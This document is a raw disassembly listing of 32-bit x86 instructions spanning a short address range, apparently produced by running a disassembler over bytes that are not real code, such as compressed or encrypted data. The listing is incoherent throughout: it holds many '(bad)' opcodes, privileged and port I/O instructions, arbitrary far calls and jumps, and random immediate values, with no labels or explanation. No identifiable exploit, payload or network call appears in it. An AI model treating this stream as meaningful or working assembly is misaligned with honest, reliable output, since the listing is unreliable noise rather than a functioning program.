  4113b7:	jg     0x4113b8
  4113b9:	mov    bh,0x5d
  4113bb:	cs push edi
  4113bd:	syscall 
  4113bf:	xlat   BYTE PTR ds:[ebx]
  4113c0:	xchg   BYTE PTR [esi-0x4912a732],al
  4113c6:	pop    esi
  4113c7:	scas   eax,DWORD PTR es:[edi]
  4113c8:	xlat   BYTE PTR ds:[ebx]
  4113c9:	push   0xffffffae
  4113cb:	mov    ds:0xeb32803f,eax
  4113d0:	jb     0x41138b
  4113d2:	sbb    al,0xb1
  4113d4:	js     0x4113d4
  4113d6:	repnz in eax,0xcb
  4113d9:	pop    ss
  4113da:	xor    al,0x4d
  4113dc:	mov    ebx,0xf3333330
  4113e1:	out    dx,al
  4113e2:	ret    0x42c2
  4113e5:	adc    al,0x80
  4113e7:	mov    edi,0x9db695e
  4113ec:	adc    esi,edx
  4113ee:	stc    
  4113ef:	cld    
  4113f0:	lds    edi,FWORD PTR [esi+edi*1+0x7f]
  4113f4:	jle    0x41146c
  4113f6:	jbe    0x4113ce
  4113f8:	adc    ecx,DWORD PTR [eax]
  4113fa:	add    al,0xd6
  4113fc:	ja     0x411475
  4113fe:	ja     0x4113ef
  411400:	or     al,BYTE PTR [esi]
  411402:	cmp    DWORD PTR [ebp+0x3e],0xffffff9f
  411406:	scas   eax,DWORD PTR es:[edi]
  411407:	iret   
  411408:	in     eax,0x72
  41140a:	lods   eax,DWORD PTR ds:[esi]
  41140b:	fwait
  41140c:	fwait
  41140d:	fwait
  41140e:	jmp    0x4113e6
  411410:	xor    al,0x4d
  411412:	mov    edi,eax
  411414:	jecxz  0x4113e9
  411416:	mov    cl,0x58
  411418:	in     al,dx
  411419:	(bad)  
  41141b:	jae    0x411490
  41141d:	xchg   DWORD PTR [ebx-0x2ee01b37],edx
  411423:	adc    BYTE PTR [esi-0x66],al
  411426:	hlt    
  411427:	lea    esi,[edi-0x32]
  41142a:	loope  0x41146e
  41142c:	das    
  41142d:	dec    ebx
  41142e:	shl    DWORD PTR [ebp+0x7cc9ea0b],cl
  411434:	jnp    0x4113df
  411436:	mov    edi,0xaf6bc325
  41143b:	mov    ebp,0x55f006e6
  411440:	jmp    0x411447
  411442:	mov    bh,0xf0
  411444:	in     eax,dx
  411445:	gs sti 
  411447:	gs push ecx
  411449:	jg     0x411424
  41144b:	mov    dh,0xcc
  41144d:	out    0x27,eax
  41144f:	or     ecx,DWORD PTR [edx-0x19127472]
  411455:	jbe    0x411444
  411457:	call   0x9fdb787e
  41145c:	or     esp,DWORD PTR [edi*8-0x57670301]
  411463:	imul   ecx,DWORD PTR [ecx],0xbe014c7c
  411469:	into   
  41146a:	dec    ebp
  41146b:	js     0x4114d7
  41146d:	push   ecx
  41146e:	mov    al,ds:0x596a2de4
  411473:	loop   0x4113f9
  411475:	shr    edi,0xc5
  411478:	daa    
  411479:	je     0x411460
  41147b:	and    al,0xc0
  41147d:	sti    
  41147e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41147f:	mov    BYTE PTR [ecx],dh
  411481:	or     bh,BYTE PTR [esi+0x6f]
  411484:	icebp  
  411485:	fldcw  WORD PTR [ecx+0x56eddb8c]
  41148b:	ja     0x41147b
  41148d:	fdivr  QWORD PTR [ecx+0x1389c4eb]
  411493:	pop    ds
  411494:	inc    edx
  411495:	scas   al,BYTE PTR es:[edi]
  411496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411497:	stc    
  411498:	mov    bh,0x40
  41149a:	jmp    0x411478
  41149c:	and    dh,BYTE PTR [eax]
  41149e:	mov    cl,0xd4
  4114a0:	or     eax,0x7ae9d710
  4114a5:	mov    dl,0x72
  4114a7:	mov    dl,0xfd
  4114a9:	cld    
  4114aa:	sbb    cl,BYTE PTR [edx+0x4ac26964]
  4114b0:	or     DWORD PTR [eax+0x66c9400a],esp
  4114b6:	mov    bl,0xb9
  4114b8:	push   edi
  4114b9:	pop    edi
  4114ba:	jge    0x4114b1
  4114bc:	jnp    0x411441
  4114be:	add    DWORD PTR [ebx+0x2be57e2f],0x5f
  4114c5:	jns    0x411475
  4114c7:	mov    ds:0xa45be3a3,eax
  4114cc:	loope  0x411521
  4114ce:	test   eax,0x16161614
  4114d3:	xchg   esi,eax
  4114d4:	jl     0x411476
  4114d6:	xchg   BYTE PTR [ecx+0x20],ah
  4114d9:	xchg   ebx,eax
  4114da:	leave  
  4114db:	pusha  
  4114dc:	jle    0x41155c
  4114de:	push   ds
  4114df:	outs   dx,BYTE PTR ds:[esi]
  4114e0:	mov    bh,0xbb
  4114e2:	stos   BYTE PTR es:[edi],al
  4114e3:	imul   ebx,edx,0xc3c3c3db
  4114e9:	mov    edi,0x513264ce
  4114ee:	shl    DWORD PTR [esi*2+0x1bbe34d4],cl
  4114f5:	xor    eax,0x655e5c21
  4114fa:	stos   BYTE PTR es:[edi],al
  4114fb:	aad    0x52
  4114fd:	ds lahf 
  4114ff:	(bad)  
  411500:	cmp    BYTE PTR [edi-0x1ffd6031],bl
  411506:	push   esi
  411507:	adc    al,0xc5
  411509:	jmp    0x41157d
  41150b:	mov    ecx,0x3d3d3dfc
  411510:	sbb    edi,DWORD PTR [ebp-0x32890a2]
  411516:	cld    
  411517:	cld    
  411518:	dec    ecx
  411519:	pop    ebp
  41151a:	xlat   BYTE PTR ds:[ebx]
  41151b:	out    0xd0,eax
  41151d:	pusha  
  41151e:	inc    edx
  41151f:	out    dx,al
  411520:	iret   
  411521:	xchg   ebx,eax
  411522:	(bad)  
  411523:	out    0x2,eax
  411525:	iret   
  411526:	add    edi,DWORD PTR [ebx+0x62]
  411529:	es push esi
  41152b:	cmp    esp,DWORD PTR [ecx+0x72d3df17]
  411531:	lahf   
  411532:	popa   
  411533:	popf   
  411534:	mov    ds:0x472cb728,al
  411539:	rcl    BYTE PTR [esi+0x1a],1
  41153c:	movups xmm1,xmm7
  41153f:	in     eax,0x64
  411541:	inc    ecx
  411542:	ins    DWORD PTR es:[edi],dx
  411543:	ffreep st(0)
  411545:	push   edx
  411546:	xchg   ebx,eax
  411547:	lahf   
  411548:	xchg   ebx,eax
  411549:	sub    DWORD PTR [esi+eax*1],0x28ae0a20
  411550:	lock and al,0x74
  411553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411554:	lods   eax,DWORD PTR ds:[esi]
  411555:	dec    ecx
  411556:	mov    al,ds:0x654045b8
  41155b:	lds    edi,FWORD PTR [edx+0x7aa13272]
  411561:	add    dh,BYTE PTR [eax-0x660e8134]
  411567:	sub    BYTE PTR [ebx-0x6c],al
  41156a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41156b:	adc    esi,DWORD PTR [ebx-0x7f]
  41156e:	pop    ss
  41156f:	lods   eax,DWORD PTR ds:[esi]
  411570:	adc    ebx,DWORD PTR [esi]
  411572:	xor    al,0x14
  411574:	mov    ebx,0x29cf8b2c
  411579:	mov    dh,0x18
  41157b:	lock jne 0x41157e
  41157e:	sub    BYTE PTR [edi+0x7dbed8cb],dl
  411584:	sti    
  411585:	ss mov bh,0xdb
  411588:	fst    QWORD PTR [ecx-0x57]
  41158b:	push   esp
  41158c:	in     al,dx
  41158d:	dec    esp
  41158e:	jno    0x4115de
  411590:	add    BYTE PTR [esi+0x6e],dh
  411593:	mov    ds:0x84cbfa68,al
  411598:	pop    ebx
  411599:	(bad)  
  41159a:	cmp    DWORD PTR [eax-0x4c],ecx
  41159d:	xor    BYTE PTR [eax-0x4d],ah
  4115a0:	sub    edx,DWORD PTR cs:[ebx+0x7b]
  4115a4:	mov    edi,0xc0658ee2
  4115a9:	jp     0x411553
  4115ab:	test   eax,0x5f91a9a9
  4115b0:	(bad)  
  4115b1:	cli    
  4115b2:	xlat   BYTE PTR ds:[ebx]
  4115b3:	(bad)  
  4115b4:	in     al,dx
  4115b5:	fnstenv [ebx+0x6db69fe7]
  4115bb:	fcomi  st,st(6)
  4115bd:	mov    eax,0xde7e1861
  4115c2:	arpl   WORD PTR [edx+0x3e765e83],cx
  4115c8:	lahf   
  4115c9:	jg     0x41162e
  4115cb:	data16 data16 out 0xd5,al
  4115cf:	pop    eax
  4115d0:	sub    al,0xf6
  4115d2:	xchg   ecx,eax
  4115d3:	imul   ebx,DWORD PTR [edx-0x191ce5f6],0x2ea0ae17
  4115dd:	sbb    al,0xa5
  4115df:	push   0xffffffb5
  4115e1:	pop    edx
  4115e2:	lods   al,BYTE PTR ds:[esi]
  4115e3:	push   esp
  4115e4:	sub    bl,BYTE PTR [ecx+0x28f9f9f9]
  4115ea:	push   0xffffff82
  4115ec:	dec    ebp
  4115ed:	iret   
  4115ee:	daa    
  4115ef:	push   cs
  4115f0:	ret    
  4115f1:	and    eax,0xfcdcf3ae
  4115f6:	push   esi
  4115f7:	es (bad) 
  4115f9:	mov    dl,0x82
  4115fb:	jp     0x411628
  4115fd:	sbb    ebx,0x186f5eed
  411603:	xchg   BYTE PTR [edi+0x132ff99d],ah
  411609:	mul    ch
  41160b:	les    ecx,FWORD PTR [edx]
  41160d:	fs inc edx
  41160f:	(bad)  
  411610:	retf   0xe032
  411613:	sbb    DWORD PTR cs:[ebp+0x23efc00b],0x2e74fad3
  41161e:	aaa    
  41161f:	stos   DWORD PTR es:[edi],eax
  411620:	or     DWORD PTR [esp+ecx*1-0x517ca8bc],ebx
  411627:	inc    edi
  411628:	jecxz  0x411679
  41162a:	shl    BYTE PTR ds:0x7143ce29,cl
  411630:	and    al,0x3b
  411632:	retf   
  411633:	and    DWORD PTR [edx+0x102b14fd],0xf9f2005d
  41163d:	test   eax,0x7603593c
  411642:	popf   
  411643:	sahf   
  411644:	les    esp,FWORD PTR [edi-0x1d]
  411647:	mul    DWORD PTR ds:0x83060842
  41164d:	mov    ebp,0xcfdbb76e
  411652:	mov    edx,0x4d4b0397
  411657:	ins    DWORD PTR es:[edi],dx
  411658:	scas   al,BYTE PTR es:[edi]
  411659:	stc    
  41165a:	ror    DWORD PTR [esi+0x2e26291],0x4e
  411661:	xlat   BYTE PTR ds:[ebx]
  411662:	loopne 0x411625
  411664:	cmp    al,0x22
  411666:	xchg   ecx,eax
  411667:	gs pop ebx
  411669:	xchg   esi,eax
  41166a:	adc    dl,BYTE PTR [eax+0x2b84d1d5]
  411670:	sbb    dl,BYTE PTR ds:0xa2ab0eb8
  411676:	pop    es
  411677:	nop    esp
  41167a:	out    dx,eax
  41167b:	icebp  
  41167c:	js     0x41167a
  41167e:	mov    ch,0xc1
  411680:	rol    ecx,0xbf
  411683:	pop    ebx
  411684:	mov    edi,0xdcb7fd7e
  411689:	outs   dx,BYTE PTR ds:[esi]
  41168a:	ja     0x4116cb
  41168c:	outs   dx,DWORD PTR ds:[esi]
  41168d:	sub    dl,BYTE PTR es:[edi+0x264c95cb]
  411694:	xor    esi,DWORD PTR [edx-0x2]
  411697:	cld    
  411698:	stc    
  411699:	pop    edi
  41169a:	pushf  
  41169b:	cmp    esi,DWORD PTR [edi-0x12]
  41169e:	cmc    
  41169f:	mov    edx,0x18d007e0
  4116a4:	sub    al,0xe3
  4116a6:	push   0xffffff82
  4116a8:	or     ebp,DWORD PTR [ebx-0x337125c8]
  4116ae:	scas   eax,DWORD PTR es:[edi]
  4116af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b0:	aas    
  4116b1:	mov    esi,esi
  4116b3:	add    ecx,DWORD PTR [ebx+0x9]
  4116b6:	add    BYTE PTR [eax+0x4627f633],dl
  4116bc:	addr16 addr16 addr16 and al,0x93
  4116c1:	leave  
  4116c2:	pop    eax
  4116c3:	das    
  4116c4:	stos   DWORD PTR es:[edi],eax
  4116c5:	xchg   ebp,eax
  4116c6:	push   eax
  4116c7:	mov    bh,0x13
  4116c9:	cld    
  4116ca:	push   esi
  4116cb:	call   0x2d5e:0x98990b9f
  4116d2:	mov    bl,0x0
  4116d4:	mov    ebx,DWORD PTR fs:[eax+0x1f]
  4116d8:	push   ecx
  4116d9:	sub    BYTE PTR [eax-0x40],cl
  4116dc:	js     0x411737
  4116de:	xor    edx,edi
  4116e0:	or     bh,BYTE PTR cs:[edi]
  4116e3:	aad    0x87
  4116e5:	xor    DWORD PTR [edx+esi*1+0x1292731f],0x78
  4116ed:	test   al,0x35
  4116ef:	leave  
  4116f0:	mov    es,WORD PTR [eax-0x307fe0d8]
  4116f6:	jno    0x411738
  4116f8:	mul    esi
  4116fa:	jne    0x4116dd
  4116fc:	add    DWORD PTR [edi],edi
  4116fe:	jp     0x41170f
  411700:	mov    esp,0xd6e64265
  411705:	enter  0xd4a0,0xe6
  411709:	or     al,0xa7
  41170b:	icebp  
  41170c:	pop    ds
  41170d:	les    eax,FWORD PTR [eax-0x61]
  411710:	test   al,0x38
  411712:	inc    esp
  411713:	adc    ah,BYTE PTR [eax-0x3d1c234]
  411719:	jbe    0x411706
  41171b:	lods   eax,DWORD PTR ds:[esi]
  41171c:	test   BYTE PTR [edi+0x39],bh
  41171f:	fbld   TBYTE PTR [ebx-0x3a82c7d4]
  411725:	add    al,0xc0
  411727:	dec    ebp
  411728:	unpckhps xmm0,XMMWORD PTR [eax]
  41172b:	into   
  41172c:	popf   
  41172d:	cmp    esi,DWORD PTR [edi-0x16]
  411730:	fdivr  QWORD PTR [ecx+0x7a7aa773]
  411736:	jp     0x4116d6
  411738:	pop    edi
  411739:	mov    ch,0x6a
  41173b:	aad    0xad
  41173d:	mov    eax,ds:0x801d6850
  411742:	fisubr WORD PTR [edx-0x4b]
  411745:	pop    edx
  411746:	pop    eax
  411747:	pop    eax
  411748:	pop    eax
  411749:	clc    
  41174a:	js     0x4117c2
  41174c:	jbe    0x4117c4
  41174e:	pop    eax
  41174f:	xlat   BYTE PTR ds:[ebx]
  411750:	jne    0x41175f
  411752:	mov    ch,0xc4
  411754:	mov    DWORD PTR [esi-0x7faa01c2],edx
  41175a:	leave  
  41175b:	jle    0x4117d6
  41175d:	loopne 0x4117ad
  41175f:	xchg   esi,eax
  411760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411761:	ja     0x411708
  411763:	data16 (bad) 
  411765:	push   ebp
  411766:	sbb    ebx,0xa07936ed
  41176c:	ins    BYTE PTR es:[edi],dx
  41176d:	cmp    DWORD PTR [edx],eax
  41176f:	fimul  WORD PTR [edx-0x65]
  411772:	fistp  DWORD PTR [ebp-0x45ca37f9]
  411778:	int3   
  411779:	in     al,dx
  41177a:	pop    ss
  41177b:	xlat   BYTE PTR ds:[ebx]
  41177c:	pop    ebx
  41177d:	pop    ebp
  41177e:	lahf   
  41177f:	imul   ecx,DWORD PTR [ebp+0x59],0xffffff82
  411783:	lea    ebp,[eax+0x9]
  411786:	mov    ch,cl
  411788:	jne    0x411714
  41178a:	mov    ds:0xaa00212c,al
  41178f:	daa    
  411790:	or     eax,0x3fa64631
  411795:	xor    eax,0x5000531f
  41179a:	or     al,0x1a
  41179c:	push   edx
  41179d:	jge    0x411787
  41179f:	(bad)  
  4117a1:	cmp    al,BYTE PTR [ecx+esi*1+0x2]
  4117a5:	out    dx,al
  4117a6:	sbb    dh,al
  4117a8:	ins    BYTE PTR es:[edi],dx
  4117a9:	inc    esp
  4117aa:	and    al,BYTE PTR [ecx+ebx*2]
  4117ad:	nop
  4117ae:	nop
  4117af:	pop    edi
  4117b0:	xchg   ebx,eax
  4117b1:	aas    
  4117b2:	xor    edi,DWORD PTR [ebp+0x52a54a87]
  4117b8:	lods   al,BYTE PTR ds:[esi]
  4117b9:	outs   dx,DWORD PTR ds:[esi]
  4117ba:	push   ebx
  4117bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117bc:	fucomp st(6)
  4117be:	pop    ebx
  4117bf:	and    ah,BYTE PTR [ecx]
  4117c1:	out    0xda,al
  4117c3:	pop    edi
  4117c4:	xor    al,0xed
  4117c6:	and    DWORD PTR [ecx+0x17],ebx
  4117c9:	ror    DWORD PTR [ecx-0x4485080],0x6e
  4117d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d1:	fucomip st,st(7)
  4117d3:	daa    
  4117d4:	mov    cl,0x0
  4117d6:	clc    
  4117d7:	add    eax,0x5494ad89
  4117dc:	sub    dh,BYTE PTR ds:0x26a54a99
  4117e2:	test   DWORD PTR [ebx+0x7e],esp
  4117e5:	aam    0x32
  4117e7:	mov    ds:0xfa99a8dc,eax
  4117ec:	lods   eax,DWORD PTR ds:[esi]
  4117ed:	and    bl,BYTE PTR [eax-0x3c1dfb61]
  4117f3:	mov    al,dl
  4117f5:	dec    ebp
  4117f6:	call   0x5d34:0xab525e9e
  4117fd:	icebp  
  4117fe:	call   0x4ae3:0xe3e304d7
  411805:	pop    edi
  411806:	pop    edi
  411807:	pop    edi
  411808:	xchg   ebx,eax
  411809:	push   esi
  41180a:	add    ebp,esp
  41180c:	fld    QWORD PTR [eax]
  41180e:	cdq    
  41180f:	xchg   esi,eax
  411810:	pop    ss
  411811:	retf   
  411812:	mov    esp,DWORD PTR [ebp-0x47]
  411815:	sbb    DWORD PTR [esi+0x676f4d1c],edi
  41181b:	cli    
  41181c:	fcmovnu st,st(5)
  41181e:	sbb    ebx,DWORD PTR [eax+0x2a]
  411821:	and    al,0x76
  411823:	les    esp,FWORD PTR [ecx]
  411825:	and    edx,DWORD PTR [ecx]
  411827:	jno    0x411861
  411829:	ja     0x411805
  41182b:	inc    edi
  41182c:	ds cmp eax,0x4a95f099
  411832:	add    eax,0xcadfbf7e
  411837:	call   0xbb0e4d0f
  41183c:	xchg   esi,eax
  41183d:	sub    al,0xf2
  41183f:	dec    edi
  411840:	push   ss
  411841:	add    DWORD PTR [ecx+0x2250750c],edx
  411847:	add    ah,BYTE PTR [eax]
  411849:	(bad)
  41184e:	bound  ecx,QWORD PTR [ebx+eax*2+0x2e5daef6]
  411855:	pop    ss
  411856:	adc    cl,BYTE PTR [ecx+0x5cb94cc4]
  41185c:	(bad)  
  41185d:	shr    DWORD PTR [ebx+ecx*2],1
  411860:	mov    ds:0xea0b2fdf,al
  411865:	push   ecx
  411866:	cmp    DWORD PTR [ecx-0x1becd171],ebx
  41186c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41186d:	xlat   BYTE PTR ds:[ebx]
  41186e:	sub    eax,0xf1f6cafc
  411873:	imul   ecx,DWORD PTR [eax+0x4f85acd6],0x42
  41187a:	add    BYTE PTR [edx-0x1932fef6],dh
  411880:	nop
  411881:	retf   0xc9d6
  411884:	fdiv   QWORD PTR [esi-0x52a3aff5]
  41188a:	jp     0x411814
  41188c:	das    
  41188d:	inc    ebp
  41188e:	jl     0x411891
  411890:	mov    esp,0x975c542d
  411895:	pop    ebp
  411896:	out    dx,eax
  411897:	call   0xad56:0x964c9922
  41189e:	pop    edx
  41189f:	aad    0x56
  4118a1:	dec    eax
  4118a2:	fs cmp esp,edi
  4118a5:	lods   eax,DWORD PTR ds:[esi]
  4118a6:	retf   0x72f3
  4118a9:	retf   
  4118aa:	adc    eax,0xdd8cb17e
  4118af:	cmc    
  4118b0:	in     eax,dx
  4118b1:	add    al,0x8e
  4118b3:	fldenv [edx+0x79]
  4118b7:	xor    ecx,ecx
  4118b9:	inc    esi
  4118ba:	lods   al,BYTE PTR ds:[esi]
  4118bb:	mov    ds:0x834961a8,eax
  4118c0:	rol    DWORD PTR [esp+ebp*4],cl
  4118c3:	inc    eax
  4118c4:	ins    DWORD PTR es:[edi],dx
  4118c5:	rcl    BYTE PTR [edi],1
  4118c7:	dec    edx
  4118c8:	and    al,0xb
  4118ca:	add    al,0x2
  4118cc:	push   esi
  4118cd:	xchg   ebx,eax
  4118ce:	mov    dl,0x9d
  4118d0:	cdq    
  4118d1:	cs out dx,al
  4118d3:	mov    ds:0x548882d1,eax
  4118d8:	mov    eax,0x3fbe20d5
  4118dd:	mov    ebx,0x7b6bf2ba
  4118e2:	mov    ebp,0x7f3f9c5e
  4118e7:	jle    0x411897
  4118e9:	push   ds
  4118ea:	(bad)  
  4118eb:	out    dx,al
  4118ec:	mov    al,ds:0xdb59a3ea
  4118f1:	retf   
  4118f2:	push   edx
  4118f3:	jge    0x4118ae
  4118f5:	dec    edi
  4118f6:	iret   
  4118f7:	shr    edx,1
  4118f9:	jnp    0x4118ae
  4118fb:	or     esp,DWORD PTR [edx+ecx*8]
  4118fe:	adc    al,0x97
  411900:	sbb    bh,al
  411902:	xor    al,BYTE PTR [ebp+0xd5c2d73]
  411908:	add    ah,al
  41190a:	mov    cr1,edx
  41190d:	adc    ebx,ebp
  41190f:	aam    0x2e
  411911:	adc    bh,BYTE PTR [ecx+0x35]
  411914:	test   DWORD PTR [edi-0x34507829],ebx
  41191a:	sbb    BYTE PTR [ecx+0x76],dl
  41191d:	dec    esp
  41191e:	jbe    0x41191e
  411920:	xor    eax,0x1e5cb947
  411925:	shl    DWORD PTR [ecx*2+0x1d02040b],cl
  41192c:	mov    dl,0xc4
  41192e:	cwde   
  41192f:	jbe    0x411933
  411931:	sub    DWORD PTR [ebx-0x46297e6],esi
  411937:	test   DWORD PTR [ecx+edx*8],0xb1d7e7cc
  41193e:	and    ecx,DWORD PTR [edx]
  411940:	push   cs
  411941:	xor    DWORD PTR [ebp-0x6a],edi
  411944:	aaa    
  411945:	lahf   
  411946:	icebp  
  411947:	std    
  411948:	pop    esp
  411949:	loopne 0x411910
  41194b:	jmp    0x4118d6
  41194d:	add    ah,BYTE PTR [edi]
  41194f:	mov    edx,0xa8009c01
  411954:	retf   
  411955:	aaa    
  411956:	pop    ebp
  411957:	das    
  411958:	lahf   
  411959:	iret   
  41195a:	add    eax,DWORD PTR [eax]
  41195c:	cld    
  41195d:	jle    0x41199e
  41195f:	inc    edx
  411960:	mov    eax,ds:0xb76edc10
  411965:	xor    eax,0x3b9d804e
  41196a:	shr    BYTE PTR [edi-0x75fdceb5],0x31
  411971:	mov    BYTE PTR [ebp-0x5e],dh
  411974:	cli    
  411975:	mov    BYTE PTR [ecx+0x46],cl
  411978:	jbe    0x41199e
  41197a:	mov    eax,0x4698b8b8
  41197f:	lods   eax,DWORD PTR ds:[esi]
  411980:	add    eax,0x89dc678b
  411985:	out    0x3d,al
  411987:	mul    edi
  411989:	scas   eax,DWORD PTR es:[edi]
  41198a:	les    ecx,FWORD PTR [edi+0x654efbb7]
  411990:	fbstp  TBYTE PTR [ebx-0x36ec13d7]
  411996:	mov    al,ds:0x2c2d709
  41199b:	mov    al,ds:0x5c8d056d
  4119a0:	data16 sub BYTE PTR [eax],0xf0
  4119a4:	xlat   BYTE PTR ds:[ebx]
  4119a5:	call   0xe87f:0x3b6dc400
  4119ac:	push   ebx
  4119ad:	adc    eax,0x34d30e7a
  4119b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b3:	repnz stc 
  4119b5:	cld    
  4119b6:	leave  
  4119b7:	dec    eax
  4119b8:	and    al,0xf2
  4119ba:	adc    eax,0xfd11e33e
  4119bf:	mov    dh,0x13
  4119c1:	jb     0x411a34
  4119c3:	pop    ebp
  4119c4:	aam    0xba
  4119c6:	lods   eax,DWORD PTR ds:[esi]
  4119c7:	mov    BYTE PTR [ebp+edx*8+0x26de0e7e],ah
  4119ce:	or     dl,BYTE PTR cs:0x248bfbf
  4119d5:	mov    dl,0x32
  4119d7:	push   esp
  4119d8:	das    
  4119d9:	push   ds
  4119da:	aaa    
  4119db:	add    BYTE PTR [edx-0x26],ch
  4119de:	cdq    
  4119df:	sti    
  4119e0:	fadd   QWORD PTR [eax]
  4119e2:	lods   al,BYTE PTR ds:[esi]
  4119e3:	mov    dh,0x7e
  4119e5:	sbb    cl,BYTE PTR [ebp-0x66]
  4119e8:	scas   al,BYTE PTR es:[edi]
  4119e9:	dec    ebx
  4119ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119eb:	jg     0x411a34
  4119ed:	inc    edi
  4119ee:	pop    es
  4119ef:	cmp    bh,BYTE PTR [edx]
  4119f1:	cmp    ah,al
  4119f3:	idiv   ebx
  4119f5:	lods   eax,DWORD PTR ds:[esi]
  4119f6:	fisub  WORD PTR [edx+0x9c1eaad]
  4119fc:	xor    BYTE PTR [edi],0x73
  4119ff:	mov    bh,BYTE PTR [ecx]
  411a01:	add    ah,BYTE PTR [edx-0x2e]
  411a04:	nop
  411a05:	int3   
  411a06:	pop    edx
  411a07:	bnd jp 0x4119c7
  411a0a:	dec    eax
  411a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a0c:	rcl    DWORD PTR [ebp-0x6030180d],cl
  411a12:	inc    edi
  411a13:	int    0xbd
  411a15:	in     eax,0xc2
  411a17:	cs mov bl,0x74
  411a1a:	fistp  WORD PTR gs:[eax-0xc4bc414]
  411a21:	jmp    0x2ebb6713
  411a26:	in     al,0x7c
  411a28:	pop    ebp
  411a29:	ins    BYTE PTR es:[edi],dx
  411a2a:	rcl    DWORD PTR [edx+0x7b120676],1
  411a30:	or     al,0x5d
  411a32:	or     eax,0x31007ab4
  411a37:	mov    edx,0x45835c6e
  411a3c:	(bad)  
  411a3d:	jp     0x4119e1
  411a3f:	jmp    0x5030f068
  411a44:	xchg   bh,al
  411a46:	pop    ds
  411a47:	jg     0x411a25
  411a49:	aam    0x34
  411a4b:	in     eax,dx
  411a4c:	in     eax,dx
  411a4d:	dec    eax
  411a4e:	and    al,0x62
  411a50:	jmp    0x411ab1
  411a52:	mov    bh,0xf3
  411a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a55:	gs call 0x8edf:0xb76f979a
  411a5d:	sbb    BYTE PTR [eax+ecx*4+0x44],al
  411a61:	and    BYTE PTR [esi-0x75946d45],bl
  411a67:	out    0x71,eax
  411a69:	imul   eax,DWORD PTR [ebp-0x4aaaaa2a],0xffffff86
  411a70:	rcl    BYTE PTR [esi],cl
  411a72:	iret   
  411a73:	loope  0x411a0b
  411a75:	add    DWORD PTR ds:0x9fe7c21c,ecx
  411a7b:	pop    esp
  411a7c:	push   cs
  411a7d:	call   0x28a2aee0
  411a82:	pop    ebx
  411a83:	fs (bad) 
  411a85:	adc    ebx,ebp
  411a87:	jae    0x411af3
  411a89:	push   0x6a
  411a8b:	xor    dl,BYTE PTR [esi]
  411a8d:	mov    ecx,ebp
  411a8f:	mov    ds:0x2b73f331,eax
  411a94:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  411a97:	(bad)
  411a9a:	iret   
  411a9b:	mov    dl,0x63
  411a9d:	nop
  411a9e:	sbb    al,0x13
  411aa0:	test   DWORD PTR [esp+edi*8+0x15],ebx
  411aa4:	sbb    ebp,0x4d
  411aa7:	mov    eax,0x2bc00416
  411aac:	fldl2e 
  411aae:	rcr    DWORD PTR [edx+0x3d],0xf8
  411ab2:	daa    
  411ab3:	pop    ecx
  411ab4:	pop    edx
  411ab5:	inc    ebp
  411ab6:	rep ins DWORD PTR es:[edi],dx
  411ab8:	and    DWORD PTR [ecx],0x7f
  411abb:	dec    edx
  411abc:	fs mov bl,0xd9
  411abf:	mov    bl,0xb9
  411ac1:	pop    esp
  411ac2:	push   cs
  411ac3:	cmp    eax,0xf3523d3d
  411ac8:	cwde   
  411ac9:	call   DWORD PTR [edx]
  411acb:	fisubr DWORD PTR [ecx-0x1]
  411ace:	push   esi
  411acf:	xchg   esi,eax
  411ad0:	add    BYTE PTR [edi],ch
  411ad2:	and    edx,DWORD PTR [ebx]
  411ad4:	dec    edx
  411ad5:	scas   al,BYTE PTR es:[edi]
  411ad6:	sub    DWORD PTR [ebp+0x5a],esp
  411ad9:	mov    ah,0x95
  411adb:	mov    esp,DWORD PTR [eax+0x47]
  411ade:	or     BYTE PTR [edx-0x3337ec86],dh
  411ae4:	xchg   esi,eax
  411ae5:	sub    eax,0x7069134
  411aea:	imul   esp,DWORD PTR [edi+0x1a],0x3329664
  411af1:	push   edi
  411af2:	lods   eax,DWORD PTR ds:[esi]
  411af3:	pop    edx
  411af4:	lea    edi,gs:[ecx]
  411af7:	shr    dh,1
  411af9:	sahf   
  411afa:	loop   0x411b3a
  411afc:	adc    bh,BYTE PTR [eax+0x3e]
  411aff:	pushf  
  411b00:	cmp    BYTE PTR ds:0x7534ba62,ch
  411b06:	imul   edi,edi,0xfe0f83e0
  411b0c:	pusha  
  411b0d:	call   0xb992:0x39720166
  411b14:	cwde   
  411b15:	mov    dl,0x6f
  411b17:	push   edx
  411b18:	push   esi
  411b19:	mov    dh,0x9d
  411b1b:	sbb    DWORD PTR [edi+0x4a],ebp
  411b1e:	push   ss
  411b1f:	push   ds
  411b20:	rcl    BYTE PTR [esi],1
  411b22:	fwait
  411b23:	mov    dh,0x6d
  411b25:	pop    ebp
  411b26:	(bad)  
  411b27:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  411b2b:	xlat   BYTE PTR ds:[ebx]
  411b2c:	inc    edx
  411b2d:	enter  0x74af,0xf9
  411b31:	dec    esp
  411b32:	mov    ds:0x3e1ead5a,al
  411b37:	jnp    0x411b2f
  411b39:	in     al,dx
  411b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b3b:	mov    ds:0xedede828,al
  411b40:	mov    ch,0x3e
  411b42:	pusha  
  411b43:	pop    ecx
  411b44:	sub    ch,BYTE PTR [esi-0x39c3a494]
  411b4a:	test   DWORD PTR [esi+0x24],ebx
  411b4d:	add    bl,BYTE PTR [ecx+0x59]
  411b50:	cmp    BYTE PTR [eax+0x2a6d5cbe],0x96
  411b57:	mov    bl,0x23
  411b59:	or     al,0xbb
  411b5b:	jp     0x411bcf
  411b5d:	rcl    BYTE PTR [ebx],cl
  411b5f:	sub    eax,0x8ddbb701
  411b64:	into   
  411b65:	into   
  411b66:	into   
  411b67:	and    eax,0xdad554f7
